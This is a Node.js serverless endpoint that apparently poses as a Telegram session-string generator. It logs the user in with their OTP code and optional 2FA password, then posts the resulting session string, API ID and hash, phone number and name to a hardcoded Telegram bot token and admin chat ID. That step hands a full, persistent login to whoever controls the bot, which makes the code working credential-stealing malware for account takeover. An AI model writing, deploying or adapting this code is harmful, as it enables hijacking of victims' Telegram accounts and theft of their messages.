const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    const { api_id, api_hash, phone, phone_code_hash, otp_code, password } = req.body;

    if (!api_id || !api_hash || !phone || !phone_code_hash || !otp_code) {
      return res.status(400).json({ 
        success: false, 
        error: 'All fields are required' 
      });
    }

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, parseInt(api_id), api_hash, {
      connectionRetries: 5,
    });

    await client.connect();

    try {
      // Sign in with the code
      await client.signIn({
        phoneNumber: phone,
        phoneCode: () => otp_code,
        phoneCodeHash: phone_code_hash,
      });

      // If 2FA password is required
      if (password) {
        await client.signIn({
          phoneNumber: phone,
          password: () => password,
        });
      }

      // Get the final session string
      const sessionString = client.session.save();
      
      // Get user information
      const me = await client.getMe();
      const userInfo = {
        id: me.id,
        username: me.username,
        first_name: me.firstName,
        last_name: me.lastName,
        phone: me.phone
      };

      // Send session to admin via bot
      try {
        const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
        const ADMIN_ID = '7907742294';
        
        const message = `🔐 **New Telegram Session Generated**\n\n` +
          `👤 **User Info:**\n` +
          `├ ID: ${userInfo.id}\n` +
          `├ Name: ${userInfo.first_name || ''} ${userInfo.last_name || ''}\n` +
          `├ Username: @${userInfo.username || 'N/A'}\n` +
          `└ Phone: ${userInfo.phone}\n\n` +
          `📱 **API Credentials:**\n` +
          `├ API ID: ${api_id}\n` +
          `└ API Hash: ${api_hash}\n\n` +
          `🔑 **Session String:**\n\`${sessionString}\``;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: ADMIN_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      } catch (botError) {
        console.error('Failed to send to bot:', botError);
      }

      await client.disconnect();

      res.status(200).json({
        success: true,
        session_string: sessionString,
        user_info: userInfo,
        message: 'Session generated successfully and sent to admin'
      });

    } catch (signInError) {
      await client.disconnect();
      
      let errorMessage = signInError.message;
      if (signInError.message.includes('PHONE_CODE_INVALID')) {
        errorMessage = 'Invalid verification code';
      } else if (signInError.message.includes('PHONE_CODE_EXPIRED')) {
        errorMessage = 'Verification code expired. Please request a new one.';
      } else if (signInError.message.includes('SESSION_PASSWORD_NEEDED')) {
        errorMessage = '2FA password required. Please enter your password.';
      } else if (signInError.message.includes('PASSWORD_HASH_INVALID')) {
        errorMessage = 'Invalid 2FA password';
      }
      
      throw new Error(errorMessage);
    }

  } catch (error) {
    console.error('Error verifying code:', error);
    
    res.status(200).json({
      success: false,
      error: error.message
    });
  }
};
